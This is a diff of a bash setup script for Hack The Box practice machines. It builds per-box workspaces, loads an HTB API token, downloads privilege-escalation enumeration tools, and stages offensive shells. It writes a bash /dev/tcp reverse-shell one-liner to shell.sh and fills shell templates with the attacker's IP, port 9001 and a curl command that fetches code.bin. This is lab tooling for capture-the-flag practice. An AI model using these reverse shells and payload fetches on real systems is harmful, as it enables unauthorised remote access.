@@ -26,8 +26,7 @@ else
   IP="$3"
 fi
 
-USER="bob"
-TUNINDEX=3
+USER="$(whoami)"
 
 # Save original HOME so the caller can restore if desired
 if [ -z "${OLD_HOME+x}" ]; then
@@ -37,101 +36,165 @@ fi
 
 # Set HOME to box-specific home
 HOME="/home/${USER}/hackthebox/${BOXNAME}"
-
-SELF="$(hostname -I | awk '{print $'$TUNINDEX'}')"
-HTB_TOKEN="$(cat /opt/Scripts/.HTB_TOKEN)"
-
-export IP
 export HOME
-export SELF
-export HTB_TOKEN
-export BOXNAME
-
-#start obsidian in background and push errors/output to /dev/null will need to copy .config/obsidian to folder or something to make it load the working directory but will figure out later...
-#and uhh.. doesn't load the newest version.. for some reason will add to notes to get it going may be just copying the vaults to show the vaults the .config/obsidian/obsidian.json but will play with later.. 
-# the current working vault =
-#/opt/obsidian/Obsidian-0.11.5.AppImage &>/dev/null &
-
-#read 'Press [Enter] key if this is first run'
-#read 'Are you sure this is the first run?'
-## Bash add pause prompt for 5 seconds ##
-#read -t 5 'I am going to wait for 5 seconds only ...'
-
-#only run if first time or will lose all work
-mkdir "$HOME"
-mkdir "$HOME/nmap"
-mkdir "$HOME/buster"
-mkdir "$HOME/www"
-mkdir "$HOME/$BOXNAME"
-touch "$HOME/notes"
-touch "$HOME/.hushlogin"
-
-# copy windows specif scripts to windows box or linux specific to linux box
-cp /opt/Scripts/auto_stabilize_shell.sh "$HOME/"
-cp /opt/Scripts/.bashrc "$HOME/"
-cp /opt/Scripts/.bash_aliases "$HOME/"
-cp /opt/Scripts/.tmux.conf "$HOME/"
-cp /opt/Scripts/.zshrc "$HOME/"
-
-if [[ "$OS" == 'win' ]]; then
-
-    #curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o $HOME/www/winPEASany.exe
-    #curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o $HOME/www/winPEAS.bat
-    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220930/winPEASx64.exe -o "$HOME/www/winpeasx64.exe"
-    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220930/winPEASany.exe -o "$HOME/www/winpeasany.exe"
-    #curl -s -L https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip -o "$HOME/www/"
-    # unzip $HOME/www/ConPtyShell.zip -d $HOME/www/
-    #curl -s -L https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip -o $HOME/www/
-    # unzip $HOME/www/RunasCs.zip -d $HOME/www/
-    #curl -s -L https://github.com/Friends-Security/SharpExclusionFinder/releases/download/v1/SharpExclusionFinder.exe -o $HOME/www/
-    #cp /opt/PEASS-ng/winPEAS/winPEASexe/binaries/Release/winPEASany.exe $HOME/www
-    #cp /opt/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat $HOME/www
-    #cp /usr/share/windows-resources/binaries/netcat32/netcat-1.11/nc64.exe $HOME/www
-    cp /usr/share/windows-resources/binaries/nc.exe "$HOME/www"
-    cp /opt/ConPtyShell/Invoke-ConPtyShell.ps1  "$HOME/www"
-    echo "Invoke-ConPtyShell $SELF 9001" >> "$HOME/www/Invoke-ConPtyShell.ps1"
-    cp /opt/ConPtyShell/ConPtyShell.exe "$HOME/www"
-    cp /opt/ConPtyShell/ConPtyShell.cs "$HOME/www"
-    cp /opt/RunasCs/RunasCs.exe "$HOME/www"
-    cp /opt/SharpExclusionFinder/SharpExclusionFinder.exe "$HOME/www"
-    cp /opt/Scripts/shell.c "$HOME/www"
-    cp /opt/Scripts/root.c "$HOME/www"
-    cp /opt/Scripts/sslshell.ps1 "$HOME/www"
-    cp /opt/Scripts/put_server1.py "$HOME/www"
-else
-    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o "$HOME/www/linpeas.sh"
-    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o "$HOME/www/linpeas_linux_amd64"
-    #cp /opt/PEASS-ng/linPEAS/linpeas.sh $HOME/www/
-    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s -o "$HOME/www/pspy64s"
-    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o "$HOME/www/pspy64"
-    cp /opt/Scripts/shell.c "$HOME/www"
-    cp /opt/Scripts/root.c "$HOME/www"
-    cp /opt/Scripts/sslshell.ps1 "$HOME/www"
-
-fi
-echo -ne "#!/bin/bash\nbash -i >& /dev/tcp/$SELF/9001 0>&1" >> "$HOME/www/shell.sh"
-chmod +x "$HOME/www/"*
-sed -i "s/REPLACE_THIS_COMMAND/curl http:\/\/$SELF\/code.bin/g" "$HOME/www/shell.c"
-sed -i "s/REPLACE_THIS_IP/$SELF/g" "$HOME/www/shell.c"
-sed -i 's/REPLACE_THIS_PORT/9001/g' "$HOME/www/shell.c"
-sed -i "s/REPLACE_THIS_IP/$SELF/g" "$HOME/www/sslshell.ps1"
-sed -i 's/REPLACE_THIS_PORT/9001/g' "$HOME/www/sslshell.ps1"
-sed -i "s/REPLACE_THIS_IP/$SELF/g" "$HOME/www/root.c"
 
 restore_home() {
   if [ -n "${OLD_HOME+x}" ]; then
     HOME="${OLD_HOME}"
     export HOME
     unset OLD_HOME
+    unset BOXNAME
+    unset IP
+    unset SELF
+    unset HTB_TOKEN
     echo "HOME restored to ${HOME}"
   else
     echo "OLD_HOME not set — nothing to restore."
   fi
 }
 
+# get Self IP
+get_self_ip() {
+  local ip
+  ip="$(hostname -I 2>/dev/null|grep -o '10.10.*'|awk '{print $1}')"
+  if [ -z "$ip" ]; then
+    ip="$(ip -4 addr show scope global 2>/dev/null|awk '/inet /{print $2}'| cut -d/ -f1|grep -o '10.10.*')" || SELF="$(ifconfig|grep 'inet 10.10.*'|awk '{print $2}')"
+  fi
+  SELF="${ip:-}"
+  export SELF
+}
+get_self_ip
+
+
+get_htb_token() {
+  # Read HTB token if readable
+  # set Token file location (for quick acess to htb api to submit flags)
+  # create function to make submitting flags easy also
+  TOKEN_FILE="/opt/Scripts/.HTB_TOKEN"
+  if [ -r "$TOKEN_FILE" ]; then
+    HTB_TOKEN="$(< "$TOKEN_FILE")"
+  else
+    HTB_TOKEN=""
+    # only warn once (avoid noisy messages on repeated sourcing)
+    if [ -z "${__HTB_TOKEN_WARNED+x}" ]; then
+      echo "Warning: token file '$TOKEN_FILE' not found or not readable — HTB_TOKEN left empty."
+      __HTB_TOKEN_WARNED=1
+    fi
+  fi
+  export HTB_TOKEN
+}
+get_htb_token
+
+export IP
+export BOXNAME
+# All Exports complete here ready for setup of environment
+
+# setup workspace
+setup_workspace() {
+  mkdir -p "$HOME"/{nmap,www,$BOXNAME}
+  [ -f "$HOME/.hushlogin" ] || touch -- "$HOME/.hushlogin"
+  # copy windows specific scripts to windows box or linux specific to linux box
+  cd || exit
+  [ -d "$HOME/Scripts" ] || git clone https://github.com/BeauJBurroughs/Scripts.git -q 
+  cp Scripts/auto_stabilize_shell.sh "$HOME/"
+  cp Scripts/.bashrc "$HOME/"
+  cp Scripts/.bash_aliases "$HOME/"
+  cp Scripts/.tmux.conf "$HOME/"
+  cp Scripts/.zshrc "$HOME/"
+  #rm -rf Scripts/
+
+}
+setup_workspace
+
+if [[ "$OS" == 'win' ]]; then
+  
+  curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat -o "$HOME/www/winPEAS.bat"
+  
+  curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o "$HOME/www/winPEASx64.exe"
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe -o "$HOME/www/winPEASx64_ofs.exe"
+  
+  curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -o "$HOME/www/winPEASany.exe"
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o "$HOME/www/winPEASany_ofs.exe"
+  
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -o "$HOME/www/winPEASx86.exe"
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86_ofs.exe -o "$HOME/www/winPEASx86_ofs.exe"
+
+  # curl -s -L https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip -o "$HOME/www/"
+  # unzip $HOME/www/ConPtyShell.zip -d $HOME/www/
+  # curl -s -L https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip -o $HOME/www/
+  # unzip $HOME/www/RunasCs.zip -d $HOME/www/
+  # curl -s -L https://github.com/Friends-Security/SharpExclusionFinder/releases/download/v1/SharpExclusionFinder.exe -o $HOME/www/
+  # cp /opt/PEASS-ng/winPEAS/winPEASexe/binaries/Release/winPEASany.exe $HOME/www
+  # cp /opt/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat $HOME/www
+  # cp /usr/share/windows-resources/binaries/netcat32/netcat-1.11/nc64.exe $HOME/www
+  cp /usr/share/windows-resources/binaries/nc.exe "$HOME/www"
+  cp /opt/ConPtyShell/Invoke-ConPtyShell.ps1  "$HOME/www"
+  echo "Invoke-ConPtyShell $SELF 9001" >> "$HOME/www/Invoke-ConPtyShell.ps1" ## move to modify shells?
+  cp /opt/ConPtyShell/ConPtyShell.exe "$HOME/www"
+  cp /opt/ConPtyShell/ConPtyShell.cs "$HOME/www" # get from gist and modify shell
+  cp /opt/RunasCs/RunasCs.exe "$HOME/www"
+  cp /opt/SharpExclusionFinder/SharpExclusionFinder.exe "$HOME/www"
+  cp /opt/Scripts/shell.c "$HOME/www"
+  cp /opt/Scripts/root.c "$HOME/www"
+  cp /opt/Scripts/sslshell.ps1 "$HOME/www"
+  cp /opt/Scripts/put_server1.py "$HOME/www"
+else # linux specific setup
+  curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o "$HOME/www/linpeas.sh"
+  curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o "$HOME/www/linpeas_linux_amd64"
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh -o "$HOME/www/linpeas_fat.sh"
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh -o "$HOME/www/linpeas_small.sh"
+  
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_386 -o "$HOME/www/linpeas_linux_386"
+  
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_arm64 -o "$HOME/www/linpeas_linux_arm64"
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_arm -o "$HOME/www/linpeas_linux_arm"
+  
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_darwin_amd64 -o "$HOME/www/linpeas_darwin_amd64"
+  # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_darwin_arm64 -o "$HOME/www/linpeas_darwin_arm64"
+  
+  curl -s -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s -o "$HOME/www/pspy64s"
+  curl -s -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o "$HOME/www/pspy64"
+  cp Scripts/shell.c "$HOME/www"
+  cp Scripts/root.c "$HOME/www"
+  cp Scripts/sslshell.ps1 "$HOME/www" # don't need here i think...
+fi
+
+modify_shells() {
+  # create the shell script (overwrite existing) and make executable
+  printf '%s\n' '#!/bin/bash' "bash -i >& /dev/tcp/$SELF/9001 0>&1" > "$HOME/www/shell.sh"
+  chmod +x "$HOME/www/shell.sh"
+
+  # helper to run sed only if file exists
+  _sed_if_exists() {
+    local file="$1"
+    local expr="$2"
+    if [ -f "$file" ]; then
+      sed -i "$expr" "$file"
+    else
+      echo "Warning: $file not found; skipping."
+    fi
+  }
+
+  # Replace placeholders in shell.c
+  _sed_if_exists "$HOME/www/shell.c" "s|REPLACE_THIS_COMMAND|curl http://$SELF/code.bin|g"
+  _sed_if_exists "$HOME/www/shell.c" "s|REPLACE_THIS_IP|$SELF|g"
+  _sed_if_exists "$HOME/www/shell.c" "s|REPLACE_THIS_PORT|9001|g"
+
+  # Replace placeholders in sslshell.ps1
+  _sed_if_exists "$HOME/www/sslshell.ps1" "s|REPLACE_THIS_IP|$SELF|g"
+  _sed_if_exists "$HOME/www/sslshell.ps1" "s|REPLACE_THIS_PORT|9001|g"
+
+  # Replace placeholder in root.c
+  _sed_if_exists "$HOME/www/root.c" "s|REPLACE_THIS_IP|$SELF|g"
+
+  echo "modify_shells: done (created $HOME/www/shell.sh and updated available templates)" 
+}
+modify_shells
+
 # Build notes
 build_notes() {
-  cat << 'EOF' >> "$HOME/notes"
+  if [[ ! -f "$HOME/notes" ]]; then
+  cat << 'EOF' > "$HOME/notes"
 # Standard enumration
 export IP='$IP' > $HOME/notes
 masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0
@@ -340,14 +403,15 @@ file inclusion/intruders
 file inclusion/intruders
   JHADDIX_LFI.txt:879
 EOF
+  fi
 }
-
 build_notes
 
 # Build obsidian files for note keeping
 # Cover page
 build_cover_page() { 
-  cat << 'EOF' >> "$HOME/$BOXNAME/000 - Cover.md"
+  if [[ ! -f "$HOME/$BOXNAME/000 - Cover.md" ]]; then
+  cat << 'EOF' > "$HOME/$BOXNAME/000 - Cover.md"
 <p align="center">
   <img  width=1024 src="" />
 </p>
@@ -357,21 +421,25 @@ build_cover_page() {
 * User:
 * root:
 EOF
+  fi
 }
 
 # loot page
 build_loot_page() {
-  cat << 'EOF' >> "$HOME/$BOXNAME/000 - Loot.md"
+  if [[ ! -f "$HOME/$BOXNAME/000 - Loot.md" ]]; then
+  cat << 'EOF' > "$HOME/$BOXNAME/000 - Loot.md"
 # Creds
 | Username | Password | Description |
 | --- | --- | -- |
 | | | |
 EOF
+  fi
 }
 
 # Nmap page
 build_nmap_page() {
-  cat << 'EOF' >> "$HOME/$BOXNAME/05 - Nmap.md"
+  if [[ ! -f "$HOME/$BOXNAME/05 - Nmap.md" ]]; then
+  cat << 'EOF' > "$HOME/$BOXNAME/05 - Nmap.md"
 # Nmap
 | Port | Service | Description |
 | --- | --- | --- |
@@ -381,13 +449,17 @@ build_nmap_page() {
 
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 EOF
+  fi
 }
 
+# setup logig to not overwrite and to only write if does not exist
 # Web enumeration page
 build_web_enumeration_page() {
-  cat << 'EOF' >> "$HOME/$BOXNAME/10 - Web Enumeration.md"
+  if [[ ! -f "$HOME/$BOXNAME/10 - Web Enumeration.md" ]]; then
+    cat << 'EOF' > "$HOME/$BOXNAME/10 - Web Enumeration.md"
 # Web Enumeration
 EOF
+  fi
 }
 
 build_obsidian_files() {
